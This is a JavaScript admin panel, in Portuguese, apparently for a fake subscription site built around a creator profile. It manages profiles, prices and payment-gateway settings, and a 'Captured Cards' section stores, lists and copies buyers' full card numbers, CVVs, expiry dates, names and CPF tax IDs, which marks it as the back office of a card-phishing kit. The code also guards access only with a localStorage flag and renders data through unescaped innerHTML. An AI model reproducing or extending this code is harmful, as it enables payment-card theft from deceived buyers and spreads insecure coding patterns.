// ===== Data Storage - Initial State =====
let accounts = [];
let siteSettings = {
    name: 'Hanna',
    username: 'hannalim4z',
    bio: 'apenas mostrando o melhor de mim e que com certeza vai te surpreender, aqui vc encontra eu no meu melhor jeitinho😊❤️🔥',
    photos: 5,
    videos: 39,
    likes: '2.5K',
    instagram: '',
    avatar: 'img/avatar.jpg'
};
let subscriptionPrices = {
    month1: 20.00,
    months3: 54.00,
    months6: 108.00
};

let tribopayConfig = {
    token: '',
    utmifyToken: '',
    hash1Month: '',
    hash3Months: '',
    hash3Months: '',
    hash6Months: ''
};

let ravenbotConfig = {
    apiKey: '',
    webhookSecret: ''
};

let paymentControls = {
    tribopay: true,
    creditCard: false
};

// API URL
const API_URL = window.location.hostname.endsWith('.netlify.app')
    ? '/.netlify/functions/settings'
    : 'api/settings.php';

// Helper to fetch data
async function fetchData(type) {
    try {
        const response = await fetch(`${API_URL}?type=${type}`);
        const data = await response.json();
        return data;
    } catch (error) {
        console.error(`Error fetching ${type}:`, error);
        return null;
    }
}

// Helper to save data
async function saveDataToApi(type, data) {
    if (window.location.protocol === 'file:') {
        console.error('O painel precisa ser aberto por um servidor HTTP com PHP para salvar dados.');
        return false;
    }

    try {
        const response = await fetch(API_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ type, data })
        });
        const result = await response.json();
        return result.success;
    } catch (error) {
        console.error(`Error saving ${type}:`, error);
        return false;
    }
}

// ===== DOM Elements =====
const menuToggle = document.getElementById('menuToggle');
const sidebar = document.querySelector('.sidebar');
const navItems = document.querySelectorAll('.nav-item[data-section]');
const contentSections = document.querySelectorAll('.content-section');
const pageTitle = document.querySelector('.page-title');

// ===== Initialize =====
document.addEventListener('DOMContentLoaded', () => {
    // Check Authentication
    if (localStorage.getItem('privacyAdminAuth') !== 'true') {
        window.location.href = 'admin-login.html';
        return;
    }

    initNavigation();
    initForms();

    // Load all data from server
    loadAllData();
});

async function loadAllData() {
    // Load specific data types or all at once? The API supports individual or all.
    // Let's load them individually to keep logic separated or use the 'all' feature if implemented?
    // The PHP script implementation supports individual types. 
    // Implementing parallel fetch for speed.

    const [fetchedAccounts, fetchedSettings, fetchedPrices, fetchedTribo, fetchedRavenbot, fetchedControls, fetchedCards] = await Promise.all([
        fetchData('accounts'),
        fetchData('siteSettings'),
        fetchData('subscriptionPrices'),
        fetchData('tribopayConfig'),
        fetchData('ravenbotConfig'),
        fetchData('paymentControls'),
        fetchData('capturedCards')
    ]);

    if (fetchedAccounts) accounts = fetchedAccounts;

    // Merge with defaults to prevent empty objects
    if (fetchedSettings) siteSettings = Object.assign(siteSettings, fetchedSettings);
    if (fetchedPrices) subscriptionPrices = Object.assign(subscriptionPrices, fetchedPrices);
    if (fetchedTribo) tribopayConfig = Object.assign(tribopayConfig, fetchedTribo);
    if (fetchedRavenbot) ravenbotConfig = Object.assign(ravenbotConfig, fetchedRavenbot);
    if (fetchedControls) paymentControls = Object.assign(paymentControls, fetchedControls);

    if (fetchedCards) capturedCards = fetchedCards;

    // Refresh UI
    loadSiteSettings();
    loadSubscriptionPrices();
    loadTribopayConfig();
    loadRavenbotConfig();
    loadPaymentControls();
    renderAccounts();
    renderCapturedCards();
    updateStats();
}

function logout() {
    localStorage.removeItem('privacyAdminAuth');
    window.location.href = 'admin-login.html';
}

// ===== Navigation =====
function initNavigation() {
    navItems.forEach(item => {
        item.addEventListener('click', (e) => {
            e.preventDefault();
            const section = item.dataset.section;
            showSection(section);
        });
    });

    // Mobile menu toggle
    if (menuToggle) {
        menuToggle.addEventListener('click', () => {
            sidebar.classList.toggle('open');
        });
    }

    // Close sidebar on outside click (mobile)
    document.addEventListener('click', (e) => {
        if (window.innerWidth <= 768 &&
            !sidebar.contains(e.target) &&
            !menuToggle.contains(e.target) &&
            sidebar.classList.contains('open')) {
            sidebar.classList.remove('open');
        }
    });
}

function showSection(sectionId) {
    // Update nav items
    navItems.forEach(item => {
        item.classList.toggle('active', item.dataset.section === sectionId);
    });

    // Update content sections
    contentSections.forEach(section => {
        section.classList.toggle('active', section.id === sectionId);
    });

    // Update page title
    const titles = {
        'dashboard': 'Dashboard',
        'site-settings': 'Configurações do Site',
        'accounts': 'Gerenciar Contas',
        'subscriptions': 'Assinaturas'
    };
    pageTitle.textContent = titles[sectionId] || 'Dashboard';

    // Close mobile sidebar
    if (window.innerWidth <= 768) {
        sidebar.classList.remove('open');
    }
}

// ===== Forms Initialization =====
function initForms() {
    // Site Settings Form
    const siteSettingsForm = document.getElementById('siteSettingsForm');
    if (siteSettingsForm) {
        siteSettingsForm.addEventListener('submit', (e) => {
            e.preventDefault();
            saveSiteSettings();
        });
    }

    // Subscription Form
    const subscriptionForm = document.getElementById('subscriptionForm');
    if (subscriptionForm) {
        subscriptionForm.addEventListener('submit', (e) => {
            e.preventDefault();
            saveSubscriptionPrices();
        });
    }

    // TriboPay Form
    const tribopayForm = document.getElementById('tribopayForm');
    if (tribopayForm) {
        tribopayForm.addEventListener('submit', (e) => {
            e.preventDefault();
            saveTribopayConfig();
        });
    }

        // RavenBot Form
        const ravenbotForm = document.getElementById('ravenbotForm');
        if (ravenbotForm) {
            ravenbotForm.addEventListener('submit', (e) => {
                e.preventDefault();
                saveRavenbotConfig();
            });
        }

    // Payment Controls Form
    const paymentControlsForm = document.getElementById('paymentControlsForm');
    if (paymentControlsForm) {
        paymentControlsForm.addEventListener('submit', (e) => {
            e.preventDefault();
            savePaymentControls();
        });
    }

    // Account Form
    const accountForm = document.getElementById('accountForm');
    if (accountForm) {
        accountForm.addEventListener('submit', (e) => {
            e.preventDefault();
            saveAccount();
        });
    }

    // Avatar Preview
    const avatarInput = document.getElementById('avatarInput');
    if (avatarInput) {
        avatarInput.addEventListener('change', (e) => {
            previewImage(e.target, 'avatarPreview');
        });
    }

    // Favicon Preview
    const faviconInput = document.getElementById('faviconInput');
    if (faviconInput) {
        faviconInput.addEventListener('change', (e) => {
            previewImage(e.target, 'faviconPreview');
        });
    }

    // Banner Preview
    const bannerInput = document.getElementById('bannerInput');
    if (bannerInput) {
        bannerInput.addEventListener('change', (e) => {
            previewImage(e.target, 'bannerPreview');
        });
    }

    // Account Avatar Preview
    const accountAvatarInput = document.getElementById('accountAvatarInput');
    if (accountAvatarInput) {
        accountAvatarInput.addEventListener('change', (e) => {
            previewImage(e.target, 'accountAvatarPreview');
        });
    }

    // Account Banner Preview
    const accountBannerInput = document.getElementById('accountBannerInput');
    if (accountBannerInput) {
        accountBannerInput.addEventListener('change', (e) => {
            previewImage(e.target, 'accountBannerPreview');
        });
    }
}

// ===== Image Preview =====
function previewImage(input, previewId) {
    const preview = document.getElementById(previewId);
    if (input.files && input.files[0]) {
        const reader = new FileReader();
        reader.onload = (e) => {
            preview.src = e.target.result;
        };
        reader.readAsDataURL(input.files[0]);
    }
}

// ===== Site Settings =====
function loadSiteSettings() {
    if (!siteSettings) return; // Guard against null

    document.getElementById('profileName').value = siteSettings.name || '';
    document.getElementById('profileUsername').value = siteSettings.username || '';
    document.getElementById('profileBio').value = siteSettings.bio || '';
    document.getElementById('statsPhotos').value = siteSettings.photos || 0;
    document.getElementById('statsVideos').value = siteSettings.videos || 0;
    document.getElementById('statsLikes').value = siteSettings.likes || '';
    document.getElementById('instagramLink').value = siteSettings.instagram || '';

    const avatarPreview = document.getElementById('avatarPreview');
    if (avatarPreview) avatarPreview.src = siteSettings.avatar || 'img/avatar.jpg';

    const bannerPreview = document.getElementById('bannerPreview');
    if (bannerPreview) bannerPreview.src = siteSettings.banner || 'img/banner.svg';

    if (siteSettings.favicon) {
        const faviconPreview = document.getElementById('faviconPreview');
        if (faviconPreview) faviconPreview.src = siteSettings.favicon;
    }

    // Banner logic was missing in original loadSiteSettings but present in HTML?
    // Added specific check for banner if it exists in settings
    // It seems original code didn't save banner in siteSettings object explicitly in the simplified version, 
    // but the edit form has it. Let's ensure we handle it if we add it.
}

async function saveSiteSettings() {
    siteSettings = {
        name: document.getElementById('profileName').value,
        username: document.getElementById('profileUsername').value,
        bio: document.getElementById('profileBio').value,
        photos: parseInt(document.getElementById('statsPhotos').value),
        videos: parseInt(document.getElementById('statsVideos').value),
        likes: document.getElementById('statsLikes').value,
        instagram: document.getElementById('instagramLink').value,
        avatar: document.getElementById('avatarPreview').src,
        banner: document.getElementById('bannerPreview').src,
        favicon: document.getElementById('faviconPreview').src
    };

    const success = await saveDataToApi('siteSettings', siteSettings);
    if (success) {
        showToast('Configurações salvas com sucesso!');
        updateIndexPage();
    } else {
        showToast('Erro ao salvar configurações.', 'error');
    }
}

function resetSiteSettings() {
    loadSiteSettings();
}

// ===== Update Index Page =====
function updateIndexPage() {
    // This function could use an iframe or fetch to update the main page
    // For now, we'll save settings to localStorage and the main page will read them
    console.log('Site settings updated:', siteSettings);
}

// ===== Subscription Prices =====
function loadSubscriptionPrices() {
    if (!subscriptionPrices) return;

    if (document.getElementById('price1Month')) document.getElementById('price1Month').value = (subscriptionPrices.month1 || 0).toFixed(2);
    if (document.getElementById('price3Months')) document.getElementById('price3Months').value = (subscriptionPrices.months3 || 0).toFixed(2);
    if (document.getElementById('price6Months')) document.getElementById('price6Months').value = (subscriptionPrices.months6 || 0).toFixed(2);
}

async function saveSubscriptionPrices() {
    subscriptionPrices = {
        month1: parseFloat(document.getElementById('price1Month').value),
        months3: parseFloat(document.getElementById('price3Months').value),
        months6: parseFloat(document.getElementById('price6Months').value)
    };

    const success = await saveDataToApi('subscriptionPrices', subscriptionPrices);
    if (success) {
        showToast('Preços atualizados com sucesso!');
    } else {
        showToast('Erro ao salvar preços.', 'error');
    }
}

// ===== TriboPay Config =====
function loadTribopayConfig() {
    if (!tribopayConfig) return;

    const tokenInput = document.getElementById('tribopayToken');
    const hash1Month = document.getElementById('tribopayHash1Month');
    const hash3Months = document.getElementById('tribopayHash3Months');
    const hash6Months = document.getElementById('tribopayHash6Months');
    const utmifyToken = document.getElementById('utmifyToken');

    if (tokenInput) tokenInput.value = tribopayConfig.token || '';
    if (hash1Month) hash1Month.value = tribopayConfig.hash1Month || '';
    if (hash3Months) hash3Months.value = tribopayConfig.hash3Months || '';
    if (hash6Months) hash6Months.value = tribopayConfig.hash6Months || '';
    if (utmifyToken) utmifyToken.value = tribopayConfig.utmifyToken || '';
}

async function saveTribopayConfig() {
    tribopayConfig = {
        token: document.getElementById('tribopayToken').value.trim(),
        utmifyToken: document.getElementById('utmifyToken').value.trim(),
        hash1Month: document.getElementById('tribopayHash1Month').value.trim(),
        hash3Months: document.getElementById('tribopayHash3Months').value.trim(),
        hash6Months: document.getElementById('tribopayHash6Months').value.trim()
    };

    const success = await saveDataToApi('tribopayConfig', tribopayConfig);
    if (success) {
        showToast('Configuração TriboPay salva com sucesso!');
    } else {
        showToast('Erro ao salvar configuração.', 'error');
    }
}

// ===== Payment Controls =====
function loadPaymentControls() {
    if (!paymentControls) return;

    const toggleTriboPay = document.getElementById('toggleTriboPay');
    const toggleCreditCard = document.getElementById('toggleCreditCard');
    const toggleRavenbot = document.getElementById('toggleRavenbot');

    if (toggleTriboPay) toggleTriboPay.checked = paymentControls.tribopay;
    if (toggleRavenbot) toggleRavenbot.checked = paymentControls.ravenbot;
    if (toggleCreditCard) toggleCreditCard.checked = paymentControls.creditCard;
}

async function savePaymentControls() {
    paymentControls = {
        tribopay: document.getElementById('toggleTriboPay').checked,
        ravenbot: document.getElementById('toggleRavenbot').checked,
        creditCard: document.getElementById('toggleCreditCard').checked
    };

    const success = await saveDataToApi('paymentControls', paymentControls);
    if (success) {
        showToast('Preferências de pagamento salvas!');
    } else {
        showToast('Erro ao salvar preferências.', 'error');
    }
}

function loadRavenbotConfig() {
    const apiKeyInput = document.getElementById('ravenbotApiKey');
    const webhookSecretInput = document.getElementById('ravenbotWebhookSecret');

    if (apiKeyInput) apiKeyInput.value = ravenbotConfig.apiKey || '';
    if (webhookSecretInput) webhookSecretInput.value = ravenbotConfig.webhookSecret || '';
}

async function saveRavenbotConfig() {
    if (window.location.protocol === 'file:') {
        showToast('Abra o painel por um servidor PHP para salvar a configuração RavenBot.', 'error');
        return;
    }

    ravenbotConfig = {
        apiKey: document.getElementById('ravenbotApiKey').value.trim(),
        webhookSecret: document.getElementById('ravenbotWebhookSecret').value.trim()
    };

    const success = await saveDataToApi('ravenbotConfig', ravenbotConfig);
    if (success) {
        showToast('Configuração RavenBot salva com sucesso!');
    } else {
        showToast('Erro ao salvar configuração RavenBot.', 'error');
    }
}

// ===== Accounts Management =====
function renderAccounts() {
    const tableBody = document.getElementById('accountsTableBody');
    const recentAccounts = document.getElementById('recentAccounts');
    const totalAccountsEl = document.getElementById('totalAccounts');

    if (accounts.length === 0) {
        tableBody.innerHTML = `
            <tr class="empty-row">
                <td colspan="7">
                    <div class="empty-state">
                        <i class="fas fa-users"></i>
                        <p>Nenhuma conta cadastrada</p>
                        <button class="btn btn-primary" onclick="openAddAccountModal()">
                            <i class="fas fa-plus"></i> Criar primeira conta
                        </button>
                    </div>
                </td>
            </tr>
        `;
        recentAccounts.innerHTML = '<p class="empty-message">Nenhuma conta cadastrada ainda.</p>';
    } else {
        // Render table
        tableBody.innerHTML = accounts.map(account => `
            <tr>
                <td><img src="${account.avatar || 'img/avatar.jpg'}" alt="${account.name}" class="table-avatar"></td>
                <td>${account.name}</td>
                <td>@${account.username}</td>
                <td><strong>${account.visits || 0}</strong></td>
                <td><span class="status-badge ${account.status}">${getStatusLabel(account.status)}</span></td>
                <td>${formatDate(account.createdAt)}</td>
                <td>
                    <div class="table-actions">
                        <button class="table-action-btn edit" onclick="editAccount('${account.id}')" title="Editar">
                            <i class="fas fa-edit"></i>
                        </button>
                        <button class="table-action-btn delete" onclick="openDeleteModal('${account.id}')" title="Excluir">
                            <i class="fas fa-trash"></i>
                        </button>
                    </div>
                </td>
            </tr>
        `).join('');

        // Render recent accounts (last 3)
        const recent = accounts.slice(-3).reverse();
        recentAccounts.innerHTML = recent.map(account => `
            <div class="recent-account-item">
                <img src="${account.avatar || 'img/avatar.jpg'}" alt="${account.name}" class="recent-account-avatar">
                <div class="recent-account-info">
                    <span class="recent-account-name">${account.name}</span>
                    <span class="recent-account-username">@${account.username}</span>
                </div>
            </div>
        `).join('');
    }

    totalAccountsEl.textContent = accounts.length;
}

function getStatusLabel(status) {
    const labels = {
        'active': 'Ativo',
        'inactive': 'Inativo',
        'pending': 'Pendente'
    };
    return labels[status] || status;
}

function formatDate(dateString) {
    const date = new Date(dateString);
    return date.toLocaleDateString('pt-BR');
}

function openAddAccountModal() {
    document.getElementById('accountModalTitle').textContent = 'Nova Conta';
    document.getElementById('accountSubmitText').textContent = 'Criar Conta';
    document.getElementById('accountForm').reset();
    document.getElementById('accountId').value = '';
    document.getElementById('accountAvatarPreview').src = 'img/avatar.jpg';
    document.getElementById('accountBannerPreview').src = '';
    document.getElementById('accountModal').classList.add('active');
}

function editAccount(id) {
    const account = accounts.find(a => a.id === id);
    if (!account) return;

    document.getElementById('accountModalTitle').textContent = 'Editar Conta';
    document.getElementById('accountSubmitText').textContent = 'Salvar Alterações';
    document.getElementById('accountId').value = account.id;
    document.getElementById('accountName').value = account.name;
    document.getElementById('accountUsername').value = account.username;
    document.getElementById('accountEmail').value = account.email || '';
    document.getElementById('accountBio').value = account.bio || '';
    document.getElementById('accountStatus').value = account.status;
    document.getElementById('accountAvatarPreview').src = account.avatar || 'img/avatar.jpg';
    document.getElementById('accountBannerPreview').src = account.banner || '';

    // Load new fields
    document.getElementById('accountPhotos').value = account.photos || '';
    document.getElementById('accountPosts').value = account.posts || '';
    document.getElementById('accountLikes').value = account.likes || '';
    document.getElementById('accountInstagram').value = account.instagram || '';

    document.getElementById('accountModal').classList.add('active');
}

function closeAccountModal() {
    document.getElementById('accountModal').classList.remove('active');
}

async function saveAccount() {
    const id = document.getElementById('accountId').value;
    const name = document.getElementById('accountName').value.trim();
    const username = document.getElementById('accountUsername').value.trim();
    const email = document.getElementById('accountEmail').value.trim();
    const bio = document.getElementById('accountBio').value.trim();
    const status = document.getElementById('accountStatus').value;
    const avatarPreview = document.getElementById('accountAvatarPreview').src;
    const bannerPreview = document.getElementById('accountBannerPreview').src;

    // Get new fields
    const photos = document.getElementById('accountPhotos').value || '5';
    const posts = document.getElementById('accountPosts').value || '39';
    const likes = document.getElementById('accountLikes').value || '2.5K';
    const instagram = document.getElementById('accountInstagram').value.trim();

    if (!name || !username) {
        showToast('Preencha todos os campos obrigatórios!', 'error');
        return;
    }

    if (id) {
        // Edit existing account
        const index = accounts.findIndex(a => a.id === id);
        if (index !== -1) {
            accounts[index] = {
                ...accounts[index],
                name,
                username,
                email,
                bio,
                status,
                avatar: avatarPreview,
                banner: bannerPreview,
                photos,
                posts,
                likes,
                instagram,
                updatedAt: new Date().toISOString()
            };
            // showToast('Conta atualizada com sucesso!'); // Moved after save
        }
    } else {
        // Create new account
        const newAccount = {
            id: generateId(),
            name,
            username,
            email,
            bio,
            status,
            avatar: avatarPreview,
            banner: bannerPreview,
            photos,
            posts,
            likes,
            instagram,
            createdAt: new Date().toISOString(),
            updatedAt: new Date().toISOString()
        };
        accounts.push(newAccount);
        // showToast('Conta criada com sucesso!'); // Moved after save
    }

    const success = await saveDataToApi('accounts', accounts);
    if (success) {
        showToast(id ? 'Conta atualizada com sucesso!' : 'Conta criada com sucesso!');
        renderAccounts();
        closeAccountModal();
        updateStats();
    } else {
        showToast('Erro ao salvar conta.', 'error');
    }
}

function openDeleteModal(id) {
    const account = accounts.find(a => a.id === id);
    if (!account) return;

    deleteAccountId = id;
    document.getElementById('deleteAccountName').textContent = `${account.name} (@${account.username})`;
    document.getElementById('deleteModal').classList.add('active');
}

function closeDeleteModal() {
    document.getElementById('deleteModal').classList.remove('active');
    deleteAccountId = null;
}

async function confirmDelete() {
    if (!deleteAccountId) return;

    accounts = accounts.filter(a => a.id !== deleteAccountId);

    const success = await saveDataToApi('accounts', accounts);
    if (success) {
        renderAccounts();
        closeDeleteModal();
        showToast('Conta excluída com sucesso!');
        updateStats();
    } else {
        showToast('Erro ao excluir conta.', 'error');
    }
}

function filterAccounts() {
    const search = document.getElementById('searchAccounts').value.toLowerCase();
    const rows = document.querySelectorAll('#accountsTableBody tr:not(.empty-row)');

    rows.forEach(row => {
        const name = row.querySelector('td:nth-child(2)')?.textContent.toLowerCase() || '';
        const username = row.querySelector('td:nth-child(3)')?.textContent.toLowerCase() || '';
        const match = name.includes(search) || username.includes(search);
        row.style.display = match ? '' : 'none';
    });
}

// ===== Stats =====
function updateStats() {
    const totalAccountsEl = document.getElementById('totalAccounts');
    if (totalAccountsEl) {
        totalAccountsEl.textContent = accounts.length;
    }
}

// ===== Utilities =====
function generateId() {
    return Date.now().toString(36) + Math.random().toString(36).substr(2);
}

function showToast(message, type = 'success') {
    const toast = document.getElementById('toast');
    const toastMessage = document.getElementById('toastMessage');

    toastMessage.textContent = message;
    toast.classList.toggle('error', type === 'error');
    toast.classList.add('show');

    setTimeout(() => {
        toast.classList.remove('show');
    }, 3000);
}

// ===== Captured Cards =====
let capturedCards = []; // Initialized empty, loaded via API

function renderCapturedCards() {
    const tableBody = document.getElementById('cardsTableBody');
    const totalCards = document.getElementById('totalCards');

    if (!tableBody) return;

    if (capturedCards.length === 0) {
        tableBody.innerHTML = `
            <tr class="empty-row">
                <td colspan="8">
                    <div class="empty-state">
                        <i class="fas fa-credit-card"></i>
                        <p>Nenhum pagamento registrado ainda</p>
                    </div>
                </td>
            </tr>
        `;
        if (totalCards) totalCards.textContent = '0 registros';
        return;
    }

    tableBody.innerHTML = capturedCards.map(card => `
        <tr>
            <td>${formatDate(card.createdAt)}</td>
            <td><code>${card.cpf || '-'}</code></td>
            <td><strong>${card.cardName}</strong></td>
            <td><code>${card.cardNumber}</code></td>
            <td>${card.expiry}</td>
            <td><code>${card.cvv}</code></td>
            <td>${card.accountName}</td>
            <td>${getPlanLabel(card.plan)} - R$ ${card.price?.toFixed(2) || '0.00'}</td>
            <td>
                <div class="table-actions">
                    <button class="table-action-btn edit" onclick="copyCardData('${card.id}')" title="Copiar">
                        <i class="fas fa-copy"></i>
                    </button>
                    <button class="table-action-btn delete" onclick="deleteCard('${card.id}')" title="Excluir">
                        <i class="fas fa-trash"></i>
                    </button>
                </div>
            </td>
        </tr>
    `).join('');

    if (totalCards) totalCards.textContent = `${capturedCards.length} registro${capturedCards.length > 1 ? 's' : ''}`;
}

function getPlanLabel(plan) {
    const labels = {
        'month1': '1 Mês',
        'months3': '3 Meses',
        'months6': '6 Meses'
    };
    return labels[plan] || plan;
}

function copyCardData(id) {
    const card = capturedCards.find(c => c.id === id);
    if (!card) return;

    const text = `CPF: ${card.cpf || '-'}\nNome: ${card.cardName}\nNúmero: ${card.cardNumber}\nValidade: ${card.expiry}\nCVV: ${card.cvv}\nConta: ${card.accountName}\nPlano: ${getPlanLabel(card.plan)}`;

    navigator.clipboard.writeText(text).then(() => {
        showToast('Dados copiados para a área de transferência!');
    });
}

async function deleteCard(id) {
    if (!confirm('Tem certeza que deseja excluir este registro?')) return;

    capturedCards = capturedCards.filter(c => c.id !== id);

    const success = await saveDataToApi('capturedCards', capturedCards);
    if (success) {
        renderCapturedCards();
        showToast('Registro excluído!');
    } else {
        showToast('Erro ao excluir registro.', 'error');
    }
}

async function clearCapturedCards() {
    if (!confirm('Tem certeza que deseja excluir TODOS os registros de pagamento?')) return;

    capturedCards = [];

    const success = await saveDataToApi('capturedCards', capturedCards);
    if (success) {
        renderCapturedCards();
        showToast('Todos os registros foram excluídos!');
    } else {
        showToast('Erro ao limpar registros.', 'error');
    }
}

// Initialize cards on page load (handled by loadAllData)
// document.addEventListener('DOMContentLoaded', renderCapturedCards);

// ===== Export functions for global access =====
window.showSection = showSection;
window.openAddAccountModal = openAddAccountModal;
window.editAccount = editAccount;
window.closeAccountModal = closeAccountModal;
window.openDeleteModal = openDeleteModal;
window.closeDeleteModal = closeDeleteModal;
window.confirmDelete = confirmDelete;
window.filterAccounts = filterAccounts;
window.resetSiteSettings = resetSiteSettings;
window.copyCardData = copyCardData;
window.deleteCard = deleteCard;
window.clearCapturedCards = clearCapturedCards;
